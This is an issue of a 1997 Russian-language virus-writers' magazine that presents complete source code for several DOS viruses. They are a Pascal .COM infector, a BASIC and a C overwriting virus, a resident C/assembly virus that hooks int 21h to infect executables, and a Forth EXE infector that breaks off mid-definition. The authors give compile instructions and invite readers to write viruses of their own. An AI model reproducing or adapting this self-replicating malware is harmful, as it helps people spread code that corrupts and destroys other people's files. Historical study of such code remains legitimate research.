
      ▄▄                  █
     ▀▀▀  Virus Magazine  █ Box 176, Kiev 210, Ukraine      IV  1997
     ▀██ ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ █ ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ ▀ ▀▀▀▀▐▀▀▀  █▀▀▀▀▀▀█
      ▐█ █▀▄ █▀▀ ▄▀▀ ▄▀▀ ▄█▄ ▄▀▀ █▀█    ▌ █ ▄▀█ █ ▄▀▀ █▄▄   █ █  █ █
       █ █ █ █▀  █▀  █    █  █▀  █ █    █ █ █ █ █ █   █     █ █  █ █
       █ ▐ ▐ ▐   ▐▄▄ ▐▄▄  ▐  ▐▄▄ ▐▄▀     ▀█ ▀▄█ ▐ ▐▄▄ ▐▄▄▄  █ █  █ █
       ▐ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  █▄▄▄▄▄▄█
          (C) Copyright, 1994-97, by STEALTH group WorldWide, unLtd.

                4.  Вирусы на языках высокого уровня.

Pascal,C,Forth и даже BASIC - эти языки применяются для создания вирусов.
Hесколько исходных текстов помогут разобраться ,что к чему.

                                PASCAL
(*########################################################################
   Приветствую всех почтенных программистов на языке Pascal
   Вирусы это хорошая возбудилка для ума,но все думают,что написать вирус
   на 'высоком' языке весьма трудно.Так вот,знайте,что это НЕПРАВДА!
   Писать на Паскале весьма легко,правда величина результирующего кода
   вызывает благоговейный трепет.:-)
   Но,что поделать,приходится этот самый код сжимать какой-либо Pklite
   и учитывать сие обстоятельство при повторной компиляции.
   Когда вы гляните вниз,то увидите откоментированный исходник
   нерезидентного вируса заражающего .COM файлы.
   Сам исходный текст был передан мне одним знакомым моего знакомого,
   а я уже дополнил и откомментировал его,чтобы все желающие могли
   написать что-либо интересненькое хотя бы по мотивам сего произведения.
--------------------------------------------------------------------------
#########################################################################*)


{$M 9000,0,250000}
uses dos;
label _1,_2;
const vir_len:word =4879;         (* Длина запоколоченного вируса *)
const max_len:word =(65535-4900); (* Макс. длина заражаемого файла *)
var       f,f1      :file;
          p,p1,p2   :pointer;
          sr        :searchrec;
          l,l1      :word;
          b         :char;

begin
     assign(f,paramstr(0));   (* Берем имя файла откудова мы загрузились *)
     reset(f,1);              (* Open it ... *)
     getmem(p,vir_len);
     blockread(f,p^,vir_len); (* Читаем начало сего файла (т.е. тело нашего
                                 запоколоченого вируса *)
     seek(f,vir_len);
     l1:=filesize(f)-vir_len; (* l1:='незараженная' длина файла *)
     getmem(p1,l1);
     blockread(f,p1^,l1);   (* Читаем с того места где начинается сама
                               оригинальная программа (т.к. весь процесс
                               заражения состоит в отодвигании программы
                               в файле на vir_len байт и записи в это место
                               тела вируса.Т.е. теперь вирус будет иметь
                               управление первым.*)
     assign(f1,'Light.com');(* Создадим на диске левый файл *)
     rewrite(f1,1);
     blockwrite(f1,p1^,l1); (* Запишем в него только что считаную программу *)
     freemem(p1,l1);
     close(f);
     close(f1);
     if paramstr(1)='10' then(* Коли в командной строке была печетана цифра 10
                                то выведем информацию о вирусе *)
     begin
     writeln('VIRUS INFO.');
     writeln('Name : Big Body.');
     writeln('Model : C-',vir_len);
     writeln('Danger : 0');
     writeln('Stealth factor : 1');
     writeln('Language : Turbo Pascal 5.5');
     writeln('Creator & K : (c) Andrew.Modifity&comment from Light General.');
     writeln;
     end;
     swapvectors;
     exec('Light.com',paramstr(1)); (* Запустим 'чистый' файл на выполнение *)
(* Теперь когда файл отработал - мы получаем управление!!! *)
     swapvectors;
     erase(f1);
     findfirst('*.com',archive,sr); (* Поищем чего бы заразить *)
_1:
    if (doserror = 0) and (sr.size<max_len) and (sr.name <>'COMMAND.COM') then
begin
     assign(f,sr.name); (* Откроем найденный файл *)
     reset(f,1);
     blockread(f,b,1);  (* Считаем первый байт *)
     if  b='M' then  goto _2; (* Если файл уже заражен то поищем другой *)
     seek(f,0);
     l:=filesize(f);
     getmem(p2,l);      (* Выделим память и считаем в нее найденый файл *)
     blockread(f,p2^,l);
     rewrite(f,1);
        (* А теперь перепишем энтот файл по новому *)
     blockwrite(f,p^,vir_len);  (* Сперва свое тело *)
     blockwrite(f,p2^,l);       (* А за ним оригинальную программу *)
_2:
     close(f);
      findnext(sr);     (* Будем искать пока файлы не закончатся *)
      goto _1;
     dispose(p);        (* Если файлы кончились то уберем за собой и выйдем *)
     dispose(p2);
     end
else
writeln('Мужики бросай работать - пошли пивасика пить!');
end.

(*########################################################################
                          Особенности :
1.После заражения файл станет .EXE программой.
  Сие происходит оттого,что вирус после компиляции являлся .EXE файлом
  а при заражении просто прилепил к себе бедный зараженный .COM файл.
  Соответственно первые байты файла стали 'MZ',что говорит системе
  об экзешности файла.
2.Всякие программы реагирующие на изменение своей длины НЕ БУДУТ вопеть
  о гнусных изменениях файла т.к. он запускается вирусом в 'очищеной' форме.
  (единственно - с неоригинальным именем...)
3.Лечить зараженные программы можно тупо в текстовом редакторе --
  просто делая DEL для первых vir_len байтов.
  Но вирусатор может сделать vir_len:=vir_len+rnd(100),а оригинальную длину
  запоминать где-либо в теле вируса ;-).
4.И еще,запомните - программа зараженная ЭТИМ вирусом с защищенной от записи
  дискеты НИКОГДА не стартует!
########################################################################*)


                                BASIC   (источник неизвестен)

            Viruses in Basic
                           ----------------


Basic is great language and often people think of it as a limited language
and will not be of any use in creating something like a virus. Well you are
really wrong. Lets take a look at a Basic Virus created by R. Burger in 1987.
This program is an overwritting virus and uses (Shell) MS-DOS to infect .EXE
files.To do this you must compile the source code using a the Microsoft
Quick-BASIC.Note the lenght of the compiled and the linked .EXE file and edit
the source code to place the lenght of the object program in the LENGHTVIR
variable. BV3.EXE should be in the current directory, COMMAND.COM must be
available, the LENGHTVIR variable must be set to the lenght of the linked

program and remember to use /e parameter when compiling.



10 REM ** DEMO
20 REM ** MODIFY IT YOUR OWN WAY IF DESIRED **
30 REM ** BASIC DOESNT SUCK
40 REM ** NO KIDDING
50 ON ERROR GOTO 670
60 REM *** LENGHTVIR MUST BE SET **
70 REM *** TO THE LENGHT TO THE **
80 REM *** LINKED PROGRAM ***
90 LENGHTVIR=2641
100 VIRROOT$="BV3.EXE"
110 REM *** WRITE THE DIRECTORY IN THE FILE "INH"
130 SHELL "DIR *.EXE>INH"
140 REM ** OPEN "INH" FILE AND READ NAMES **
150 OPEN "R",1,"INH",32000
160 GET #1,1
170 LINE INPUT#1,ORIGINAL$
180 LINE INPUT#1,ORIGINAL$
190 LINE INPUT#1,ORIGINAL$
200 LINE INPUT#1,ORIGINAL$
210 ON ERROR GOT 670
220 CLOSE#2
230 F=1:LINE INPUT#1,ORIGINAL$
240 REM ** "%" IS THE MARKER OF THE BV3
250 REM ** "%" IN THE NAME MEANS
260 REM  ** INFECTED COPY PRESENT
270 IF MID$(ORIGINAL$,1,1)="%" THEN GOTO 210
280 ORIGINAL$=MID$(ORIGINAL$,1,13)
290 EXTENSIONS$=MID$(ORIGINAL,9,13)
300 MID$(EXTENSIONS$,1,1)="."
310 REM *** CONCATENATE NAMES INTO FILENAMES **
320 F=F+1
330 IF MID$(ORIGINAL$,F,1)=" " OR MID$ (ORIGINAL$,F,1)="." OR F=13 THEN
GOTO 350
340 GOTO 320
350 ORIGINAL$=MID$(ORIGINAL$,1,F-1)+EXTENSION$
360 ON ERROR GOTO 210
365 TEST$=""
370 REM ++ OPEN FILE FOUND +++
380 OPEN "R",2,OROGINAL$,LENGHTVIR
390 IF LOF(2) < LENGHTVIR THEN GOTO 420
400 GET #2,2
410 LINE INPUT#1,TEST$
420 CLOSE#2
431 REM ++ CHECK IF PROGRAM IS ILL ++
440 REM ++ "%" AT THE END OF THE FILE MEANS..
450 REM ++ FILE IS ALREADY SICK ++
460 REM IF MID$(TEST,2,1)="%" THEN GOTO 210
470 CLOSE#1
480 ORIGINALS$=ORIGINAL$
490 MID$(ORIGINALS$,1,1)="%"
499 REM ++++ SANE "HEALTHY" PROGRAM ++++
510 C$="COPY "+ORIGINAL$+" "+ORIGINALS$
520 SHELL C$
530 REM *** COPY VIRUS TO HEALTHY PROGRAM ****
540 C$="COPY "+VIRROOT$+ORIGINAL$
550 SHELL C$
560 REM *** APPEND VIRUS MARKER ***
570 OPEN ORIGINAL$ FOR APPEND AS #1 LEN=13
580 WRITE#1,ORIGINALS$
590 CLOSE#1
630 REM ++ OUYPUT MESSAGE ++
640 PRINT "INFECTION IN " ;ORIGIANAL$; "  !! BE WARE !!"
650 SYSTEM
660 REM ** VIRUS ERROR MESSAGE
670 PRINT "VIRUS INTERNAL ERROR GOTTCHA !!!!":SYSTEM
680 END


This basic virus will only attack .EXE files. After the execution you will
see a "INH" file which contains the directory, and the file %SORT.EXE.
Programs which start with "%" are NOT infected ,they pose as back up copies.

---------------------------------------------------------------------------

                           C    (источник неизвестен)

/*
  This is a pretty lame program, I would not advise running it on yourself
  though.  It will merely overwrite found files with itself, thus replicating.
  It is for educational purposes only.  Careful, since it overwrites, it is
  destructive.  Infecte files cannot be recovered.  I could save time/date
  stamps, etc. but this was just for fun, and took me only a few mintes to
  throw together.
     The Crypt Keeper/RRG
     (619)/457-1836: The Programmer's Paradise
   Oh yeah, use the tiny memory model, and make it a .COM file.
*/

#include <dos.h>
#include <dir.h>
#include <stdio.h>

#define V_SIZE 7424

int n_inf=0;

void resume(void);
void inf(char *vir, char *filename);
int  compare(char *d, char *e);

void main(int argc, char **argv)
{
  struct ffblk fileinfo;
  char vir[V_SIZE];
  FILE *fp;
  char path[6];
  int b,a=0;

  argc++;

  if((fp=fopen(argv[0],"rb"))==NULL) resume();
  fread(vir,sizeof(char),V_SIZE,fp);
  fclose(fp);

  path[0]='*';
  path[1]='.';
  path[2]='E';
  path[3]='X';
  path[4]='E';
  path[5]=NULL;

  if(findfirst(path,&fileinfo,FA_ARCH)==-1) resume();
  inf(vir,fileinfo.ff_name);
  do {
    if(findnext(&fileinfo)!=0) a=1;
    else inf(vir,fileinfo.ff_name);
    if((a==1) || (n_inf>4)) b=1;
  } while (b!=1);
  resume();
}

void inf(char *vir, char *filename)
{
  FILE *fp;
  char checkinf[V_SIZE];

  if((fp=fopen(filename,"rb+"))==NULL) resume();
  fread(checkinf,sizeof(char),V_SIZE,fp);
  if(compare(vir,checkinf)==0) return;
  fseek(fp,0L,SEEK_SET);
  fwrite(vir,sizeof(char),V_SIZE,fp);
  fclose(fp);
  n_inf++;
}

int compare(char *d, char *e)
{
  int a;

  for(a=0;a<V_SIZE;a++) if(d[a]!=e[a]) return(1);
  return(0);
}

void resume(void)
{
  exit(0);
}

---------------------------------------------------------------------------
                      ЕЩЕ ОДИH ВИРУС HА   Cи

/* RCE-2048  Вирус на Си и для Си...

o Hесколько слов о данном проекте.
   Я использовал программу TCC как транслятор_интерпретатор Си --> Ассемблер.
   При этом не!использовались стандартные библиотеки ввода-вывода.
   Исходный текст колет(режет) глаза asm вставками
   HО теперь без особых затрат можно написать вирус на Си в довольно удобной
   обстановке.
   Как всегда в тексте отсутствуют подробные комментарии,но сие вызывает
   надежду,что одна-две личности посредством лазания в дебуггер и
   результирующий .ASM файл получат ясное представление о коде получаемом
   в процессе работы компиляторов ЯВУ.

o Идеология проекта.
   При использовании пакета Си фирмы Borland, можно задать автономному
   компилятору опцию <сделать выходной .ASM файл>.Затем этот файл компилируем
   TASM'ом и линкуем TLINK'ом.Если не использовать стандартные библиотеки
   компилятора,то получим автономную программу с широкими возможностями
   перемещения!

o Особенности программирования.
 - Прошу обратить внимание на то,что все выше и ниже приведенные данные
   относятся к пакету :
   'Turbo C Version 2.0  Copyright (c) 1987, 1988 Borland International'
   (Я просто не разбирался со старшими/младшими версиями)
 - Адресация глобальных переменных :
   В данном случае сегмент DS должен указывать на программу так,чтобы
   ее стартовое смещение равнялось 0000.
 - Адресация локальных переменных :
   Адреса вычисляются относительно SS:adr,а обращение через NEAR указатель
   на локальную переменную ведется относительно DS:adr.
   Т.е. приходится обращаться к ним по дальнему указателю SS:adr
   (или при входе в резидентную часть вируса устанавливать SS на свой
   сегмент данных)

o Процесс компиляции вируса.
 - Транслируем исходник : TCC -u- -O -S virus.c (у меня TC-2.0 !!!)
   '-u-' < в именах не всовываются знаки '_'
   '-O ' < оптимизирует переходы в условиях,циклах и т.д.
   '-S ' < делать .ASM исходник
 - Компилируем выходной .ASM файл : TASM /m3/t/z virus.asm
 - Линкуем в .EXE : tlink /x virus.obj

o От себя.
   ЭТОТ исходный текст предоставлен как пример написания вируса на Си.
   Данный вирус является типичным представителем семейства RCE.
   Он записывается в конец файла и при установке тела в резидентное положение
   перемещает его в памяти.
   А за стиль программирования мне не стыдно...

                                                Light General
----------------------------------------------------------------------------
*/

#pragma inline
#define dword unsigned long
#define word unsigned int
#define byte unsigned char

/* -------- эта часть подло украдена из борландовского DOS.H --------- */
#define FP_OFF(fp)      ((unsigned)(fp))
#define FP_SEG(fp)      ((unsigned)((unsigned long)(fp) >> 16))
#define MK_FP(seg,ofs)  ((void far *) \
                           (((unsigned long)(seg) << 16) | (unsigned)(ofs)))
#define poke(a,b,c)     (*((word  far*)MK_FP((a),(b))) = (word)(c))
#define pokeb(a,b,c)    (*((byte far*)MK_FP((a),(b))) = (byte)(c))
#define peek(a,b)       (*((word  far*)MK_FP((a),(b))))
#define peekb(a,b)      (*((byte far*)MK_FP((a),(b))))
/* ------------------------------------------------------------------- */

void start(void);
void beep(void);  /* для тестирования! */
void execute_far(word seg,word ofs,word segreg,word ssreg,word spreg);
void run_infected(void);
void freemem(word seg);
word getmem(word len);
void install(void);
void intr(byte intn);
void Int21manager(void);
word f_open(word segn,word ofsn,byte mode);
void f_close(word hndl);
void f_write(word seg,byte *ofs,word len,word hndl);
void f_read(word seg,byte *ofs,word len,word hndl);
void f_size(word hndl,word *LenHi,word *LenLo);
void f_pos(word hndl,word pHi,word pLo);
void GetFtime(word hndl);
void PutFtime(word hndl);
byte SetFattr(word segn,word ofsn,word f_attr);
byte ModFattr(word segn,word ofsn);
void WriteBody(word hndl);
void COMinfect(word hndl);
void EXEinfect(word hndl);
byte Int21proc(void);
void CodeEND(void); /* адрес конца кодовой части */

/* Описание варов на глобале обеспечит им реальные ячейки в памяти */
/* их область лежит сразу за кодом */
byte origb[0x20]={0xB8,0x00,0x4C,0xCD,0x21}; /* mov ax,4c00h int 21h */
byte virusname[]="Unix-666.0";
byte copyright[]="(c) Light General";
word OurEntrySEG=0;
word OurTsrSEG=0; /* сегмент вируса в резидентном положении */
word PSPs=0;     /* сегментный адрес PSP = DS = ES при старте */
word OldSS=0; /*              */
word OldSP=0; /*    Это надо  */
word OldCS=0; /*  для запуска */
word OldIP=0; /*   .EXE З.П. */
word ax_=0,bx_=0,cx_=0,dx_=0,si_=0,di_=0,es_=0,ds_=0,fl_=0;
byte carry_=0;
word Old21o=0,Old21s=0;
word int_ax=0,int_bx=0,int_dx=0,int_cx=0,int_si=0,int_di=0,int_ds=0,int_es=0;
word int_bp=0,int_carry=0;
word lenHi=0,lenLo=0;
byte vecON=0;
word ftime=0,fdate=0,fattr=0;
struct
{
byte Jcop;      /* КОП команды JMP NEAR xxxx */
word Jaddr;     /* адрес для перехода - ^^^^ */
byte ID1;       /* метка зараженности1 */
byte ID2;       /* метка зараженности2 */
} NewBytes;

struct EXEheader
{
byte ExeID1;            /* Mz */
byte ExeID2;            /* mZ */
word TailBytes;         /* количество байтов в последнем блоке */
word Blk512b;           /* число блоков по 512 байт в файле */
word x1;
word ParaInHeader;      /* число параграфов в заголовке */
word x2;
word x3;
word EXEss;             /* SS */
word EXEsp;             /* SP */
word OurID;             /* вобщем тут контрольная сумма,но ... плевать! */
word EXEip;             /* IP */
word EXEcs;             /* CS */
word x4;
};

/*
>>>>>>>>>>>>>  Поехала кодовая часть  <<<<<<<<<<<<<<
*/
/* в самой первой ф-ции нельзя применять локальные переменные ибо тогда
   транслятор вставит mov bp,sp... */
void start(void)
{
asm .model tiny
asm .code
asm org 00h     /* компилимся в .exe и без определенного entry */
asm call $+3
asm pop ax
asm sub ax,03   /* чтобы иметь возможность обращаться к переменным */
asm mov cx,0xf  /* надо сделать чтобы вирус располагался со смещения 0000 */
asm or ax,cx    /* за сим,я из текущего CS:IP вируса вычисляю newCS:0 */
asm sub ax,cx   /* и устанавливаю DS=newCS (и активирую код вируса для */
asm mov cl,4    /* данной адресации) */
asm shr ax,cl
asm mov cx,cs
asm add ax,cx
asm mov ds,ax
asm mov cx,offset MovedCont
asm push ax cx
asm retf
asm MovedCont:
asm mov OurEntrySEG,cs
asm mov PSPs,es /* PSP segment */
;
vecON=0;
install();
run_infected();
}

void beep(void)
{
asm push ax bx bp
asm mov ax,0x0e07
asm int 0x10
asm pop bp bx ax
}

void execute_far(word seg,word ofs,word segreg,word ssreg,word spreg)
{
asm mov si,seg
asm mov di,ofs
asm mov ax,segreg
asm mov es,ax
asm mov ds,ax
asm cli
asm mov ax,ssreg
asm mov dx,spreg
asm mov ss,ax
asm mov sp,dx
asm sti
asm push si
asm push di
asm retf
}

void run_infected(void)
{
word i;
 if(origb[0]=='M' && origb[1]=='Z')
{ /* .exe file */
  i=PSPs+0x10;execute_far(OldCS+i,OldIP,PSPs,OldSS+i,OldSP);
}
  /* .com file */
  for(i=0;i!=10;i++) pokeb(PSPs,0x100+i,origb[i]);
  execute_far(PSPs,0x100,PSPs,PSPs,0xFFFE);
}

void freemem(word seg)
{
asm push es
asm mov es,seg
asm mov ah,0x49
asm int 0x21
asm pop es
}

word getmem(word len) /* без контроля выделяемости!!! */
{
asm mov ah,48h
asm mov bx,len
asm int 0x21
asm jnc getted_OK
asm mov ax,bx
getted_OK:
return _AX;
}


void install(void)
{word i; /* вар определенный на локале - имеет место в СТЕКЕ */
dword far *int21vec;
_AX=0xffa0;
asm int 0x21
if(_AX==0x1996) return; /* уже в памяти! */
_AX=0x3521;
asm int 0x21            /* узнать адрес int 21h */
Old21o=_BX;
Old21s=_ES;
freemem(PSPs);          /* освободим ВСЮ память */
;
/* выделением ошибочного размера памяти получаем */
/* реальную длину того,что можно выделить */
/* и выделяем память для оригинальной программы -101h */
i=getmem(getmem(-1)-0x101);
;
OurTsrSEG=getmem(0x100);  /* выделим память для тела вируса */
                          /* OurTsrSEG = сегментн. адр. "откуш." памяти!*/
;
pokeb(i-1,0,'Z');       /* отмечаем блок для оригинальной программы
                           как последний */
;
/* переносим тело вируса в выделенную память */
for(i=0;i!=2048;i++)
pokeb(OurTsrSEG,i,peekb(OurEntrySEG,i));
;
/* ставим свой обработчик на int 21h */
int21vec=MK_FP(0,0x21*4);
*int21vec=(dword)MK_FP(OurTsrSEG,*Int21manager);
}

void intr(byte intn)
{
vecON=1;
asm mov al,intn
asm mov intrnum,al
asm mov ax,ax_
asm mov bx,bx_
asm mov cx,cx_
asm mov dx,dx_
asm mov si,si_
asm mov di,di_
asm mov es,es_
asm mov ds,ds_
asm db 0xcd             /* int */
asm intrnum db 0        /*  xx */
asm push ds cs
asm pop ds
asm pop ds_
asm mov ax_,ax
asm mov bx_,bx
asm mov cx_,cx
asm mov dx_,dx
asm mov si_,si
asm mov di_,di
asm mov es_,es
asm pushf
asm pop ax
asm mov fl_,ax
asm and al,1
asm mov carry_,al
vecON=0;
}

void Int24manager(void)
{
asm mov al,3
asm iret
}

void Int21manager(void)
{
asm add sp,04   /* выбиваем из стека примочки транслятора */
asm pushf
asm cmp BYTE PTR cs:[offset vecON],1 /* вызов вектора произведен из вируса? */
asm jnz NoOurCALL                    /* Hет! */
asm push WORD PTR cs:[offset Old21s]
asm push WORD PTR cs:[offset Old21o]
asm retf 02
NoOurCALL:
asm push ds cs
asm pop ds
asm pop int_ds
asm pop int_carry
asm mov int_es,es
asm mov int_ax,ax
asm mov int_bx,bx
asm mov int_cx,cx
asm mov int_dx,dx
asm mov int_si,si
asm mov int_di,di
asm mov int_bp,bp
if(Int21proc()==0)      /* 0 - goto original 21h ; 1 - RETF 02 */
{
asm pushf
asm push Old21s
asm push Old21o
}
asm mov ax,int_ax
asm mov bx,int_bx
asm mov cx,int_cx
asm mov dx,int_dx
asm mov si,int_si
asm mov di,int_di
asm mov bp,int_bp
asm mov es,int_es
asm push int_carry
asm popf
asm mov ds,int_ds
asm retf 02
}

word f_open(word segn,word ofsn,byte mode)
{
/* mode => readONLY=0,writeONLY=1,read/write=2 */
ax_=0x3D00+mode;dx_=ofsn;ds_=segn;
intr(0x21);
if(carry_!=01) return ax_;else return 0;
}

void f_close(word hndl)
{
ax_=0x3E00;bx_=hndl;
intr(0x21);
}

void f_write(word seg,byte *ofs,word len,word hndl)
{
ax_=0x4000;bx_=hndl;cx_=len;dx_=(word)ofs;ds_=seg;
intr(0x21);
}

void f_read(word seg,byte *ofs,word len,word hndl)
{
ax_=0x3F00;bx_=hndl;cx_=len;dx_=(word)ofs;ds_=seg;
intr(0x21);
}

void f_size(word hndl,word *LenHi,word *LenLo)
{word lh,lo;
ax_=0x4201;bx_=hndl;cx_=0;dx_=0;
intr(0x21);
lh=dx_;lo=ax_;
ax_=0x4202;bx_=hndl;cx_=0;dx_=0;
intr(0x21);
*LenHi=dx_;
*LenLo=ax_;
ax_=0x4200;bx_=hndl;cx_=lh;dx_=lo;
intr(0x21);
}

void f_pos(word hndl,word pHi,word pLo)
{
ax_=0x4200;bx_=hndl;cx_=pHi;dx_=pLo;
intr(0x21);
}

void GetFtime(word hndl)
{
ax_=0x5700;bx_=hndl;
intr(0x21);
fdate=dx_;ftime=cx_;
}

void PutFtime(word hndl)
{
ax_=0x5701;bx_=hndl;
dx_=fdate;cx_=ftime;
intr(0x21);
}

byte SetFattr(word segn,word ofsn,word f_attr)
{
ax_=0x4301;ds_=segn;dx_=ofsn;cx_=f_attr;
intr(0x21);
return (carry_ ? 0 : 1);
}

byte ModFattr(word segn,word ofsn)
{
ax_=0x4300;ds_=segn;dx_=ofsn;
intr(0x21);
fattr=cx_;
return SetFattr(segn,ofsn,0x20);
}

void WriteBody(word hndl)
{word ParaLen;
 ParaLen=(lenLo|0x0f)+1;        /* округляемся на параграф+1 */
                                /* для нашего чудо-старта */
 f_pos(hndl,lenHi,ParaLen);
 f_write(OurTsrSEG,0,2048,hndl);
}

void COMinfect(word hndl)
{
 if(origb[3]=='*' && origb[4]=='*') return;  /* уже заражен */
 if(lenLo>60000 && lenHi==0) return;
 WriteBody(hndl);
 NewBytes.Jcop=0xE9;
 NewBytes.Jaddr=(lenLo|0x0f)-2; /* адрес с учетом выравнивания */
 NewBytes.ID1='*';
 NewBytes.ID2='*';
 f_pos(hndl,0,0);
 f_write(OurTsrSEG,&NewBytes.Jcop,5,hndl);
}

void EXEinfect(word hndl)
{word testLen,len1;
 struct EXEheader *hdr=origb;
 if(hdr->OurID==0x1996) return;  /* уже заражен */
 testLen=((hdr->Blk512b-1)*512)+hdr->TailBytes;
 if(testLen!=lenLo) return; /* OVERлей */
 WriteBody(hndl);
 OldSS=hdr->EXEss ; OldSP=hdr->EXEsp;
 OldCS=hdr->EXEcs ; OldIP=hdr->EXEip;
 testLen=((lenLo|0x0f)+1);
 len1=hdr->ParaInHeader;
 _AX=testLen;_CX=0x10;
 _DX=lenHi;
  asm div cx
  asm sub ax,len1;  /* пришлось так сделать ... */
  asm sbb dx,0      /* я бы этого товарища Борланда! */
 hdr->EXEip=_DX ; hdr->EXEcs=_AX;
 hdr->EXEss=_AX ; hdr->EXEsp=4096;
 hdr->Blk512b+=(2048/512);
 hdr->OurID=0x1996;
 f_pos(hndl,0,0);
 f_write(OurTsrSEG,origb,0x001E,hndl);
}

/*------------------ центральная часть нашего int21h ------------------*/
byte Int21proc(void)
{word hndl,i=0,nameofs=0;
 byte namesym;
 dword far *int24vec;
 dword adrInt24;
   if(int_ax==0xffa0) {int_ax=0x1996;return 1;}
   if(int_ax!=0x4b00) return 0;
   beep(); /* для тестирования!!! */
  /* --------- Проверка на COMMAND.COM --------------------------- */
   while(peekb(int_ds,int_dx+i)!=0)
   {
    if(peekb(int_ds,int_dx+i)=='\\') nameofs=i+1;
    i++;
   }
   namesym=peekb(int_ds,int_dx+nameofs)|' ';
   if(namesym=='c') return 0;  /* cOMMAND.com */
  /* ------------------------------------------------------------- */
   int24vec=MK_FP(0,0x24*4);
   adrInt24=*int24vec;
   *int24vec=(dword)MK_FP(OurTsrSEG,*Int24manager); /* set our int24h */
  /* ------------------------------------------------------------- */
   hndl=f_open(int_ds,int_dx,0); /* открываем только для чтения */
   if(hndl==0) goto Rs24andExit;  /* если файл HЕ открылся */
  /* - сохраняем время,дату,атрибут,и ставим нормальный аttрибут - */
   GetFtime(hndl);
   if(ModFattr(int_ds,int_dx)==0)
    {f_close(hndl);goto Rs24andExit;} /* диск защищен от записи */
  /* ------------------------------------------------------------- */
   f_close(hndl);
   hndl=f_open(int_ds,int_dx,2);  /* открываем для чтения и записи */
  /* ------------------------------------------------------------- */
   f_size(hndl,&lenHi,&lenLo);
   f_read(OurTsrSEG,origb,0x001E,hndl); /* чтем начальные байты файла */
   if(origb[0]=='M' && origb[1]=='Z')
     EXEinfect(hndl);
     else COMinfect(hndl);
  /* ----- восстанавливаем оригинальные время,дату,аttрибут ----- */
  /* ------------------- и закрываем файл ----------------------- */
   PutFtime(hndl);
   f_close(hndl);
   SetFattr(int_ds,int_dx,fattr);
  /* ------------------------------------------------------------- */
Rs24andExit:
   *int24vec=adrInt24; /* restore original int24h */
   return 0;
}

void CodeEND(void)
{
/* для того,чтобы при компиляции смещения переменных вычислялись от
   начала кода мы пишем assume ... */
asm ASSUME cs:NOTHING,ds:NOTHING,ss:NOTHING
}


----------------------------------------------------------------------------
                                FORTH

( VIRUS FOR TARGET COMPILING                         06/30/96 )

                       ┌──────────────────────────────────────┐
 (C) Light General     │                                      │
                       │ Hерезидентный вирус заражающий *.EXE │
  VIRUS INFO           │                                      │
 Name  : FORTH-1       │ Длина тела вируса 1303 байт.         │
 Model : E-4608        │ Всего к файлу дописывается 4608 байт.│
                       │ Заражение однократное.               │
                       │ Оверлейные файлы не заражаются.      │
                       │ Hе обрабатываем int24h               │
                       │ Заражается один файл в текущем пути. │
                       │                                      │
                       └──────────────────────────────────────┘

----------------------------------------------------------------
VARIABLE DTA_ 80 ALLOT  VARIABLE MASK_ " *.EXE" 0 C,
VARIABLE HANDLE_ HEX 003F CONSTANT ATTR_

CODE INT21 ( ax bx cx dx -- ax carry )
 DX POP CX POP BX POP AX POP 21 INT
 AX PUSH  AX, # 00 MOV ( FALSE )
    1$ JC
    AX DEC  ( TRUE (for FORTH!!!!) )
1$:
    AX PUSH
    NEXT,
END-CODE

: HANDLE@ HANDLE_ @ ;

CODE GO_VIRUS
 CLI BP, DS MOV AX, CS MOV DS, AX MOV AX, # 1600 ADD ES, AX MOV
 DI, # 00 MOV SI POP SI, # 03 SUB CX, # 1600 MOV
 REPZ MOVSB
 BX, # 00F0 MOV DS, AX MOV [BX], BP MOV AX PUSH
 AX, # 0100 MOV AX PUSH FAR RET
 ( <- Go to standart Forth frame )
END-CODE

CODE GO_PROG
 ( Code for run infected file!  [CS IP SS SP -- ] )
 BP, F0 MOV ES, BP MOV DS, BP MOV
 DX, # 0080 MOV AH, # 1A MOV 21 INT CLI CS PUSH DS POP
 SP, 06 MOV AX, 04 MOV AX, BP ADD AX, # 10 ADD SS, AX MOV
 AX, 00 MOV AX, BP ADD AX, # 10 ADD AX PUSH 02 PUSH DS, BP MOV
 STI
 FAR RET
END-CODE

VARIABLE CS_ VARIABLE IP_ VARIABLE SS_ VARIABLE SP_
: GO_PROG_PREV
  CS_ @ 0 ! IP_ @ 2 ! SS_ @ 4 ! SP_ @ 6 ! ;

VARIABLE HEADER_ 20 ALLOT    VARIABLE CARRY_
: FIND_FIRST 4E00 0 ATTR_ MASK_ 3 + INT21 2DROP ;
: FIND_NEXT  4F00 0 0 0 INT21 CARRY_ ! DROP ;
: OPEN_FILE  3D02 0 0 DTA_ 1E + INT21 DROP HANDLE_ ! ;
: CLOSE_FILE 3E00 HANDLE@ 0 0 INT21 2DROP ;
: READ_HEADER 3F00 HANDLE@ 1C HEADER_ INT21 2DROP ;
: ?EXE HEADER_ @ 5A4D = ;
: ?ALR HEADER_ 12 + @ 2424 = ;
: SET_DTA 1A00 0 0 DTA_ INT21 2DROP ;

CODE GET_FLEN ( HANDLE -- LOLEN HILEN )
 BX POP AX, # 4202 MOV CX, CX XOR DX, DX XOR 21 INT
 AX PUSH DX PUSH NEXT,
END-CODE

VARIABLE CALL_ 3 ALLOT

: CALL! 00E8 CALL_ ! 0 CALL_ 2+ ! CALL_ ;

: WRITE_BODY  ( F.p. уже в конце файла! )
   4000 HANDLE@ 03 CALL! INT21 2DROP
   4000 HANDLE@ 0100 3 -  ['] GO_VIRUS 2+ INT21 2DROP
   4000 HANDLE@ 1100 0100 INT21 2DROP ;

: WRITE_HEADER
   4200 HANDLE@ 0 0 INT21 2DROP
   4000 HANDLE@ 1C HEADER_ INT21 2DROP ;

CODE CALCULATE ( HILEN LOLEN DI -- NEWCS NEWIP )
 DI POP AX POP DX POP CX, # 10 MOV CX DIV AX, DI SUB
 DX, # 0 SBB AX PUSH DX PUSH
NEXT,
END-CODE

: FINFECT_ ( HILEN LOLEN -- )
   HEADER_ 8 + @ CALCULATE SWAP DUP 20 +
   HEADER_ 0E + ! HEADER_ 16 + ! HEADER_ 14 + !
   3000 HEADER_ 10 + ! ( SS CS IP SP ) 2424 HEADER_ 12 + !
   HEADER_ 04 + DUP @ 6 + SWAP ! ( VIRLEN = 512*6 )
   WRITE_BODY WRITE_HEADER ;

: FINFECT
  HEADER_ DUP 000E + @ SS_ ! DUP 0010 + @ SP_ !
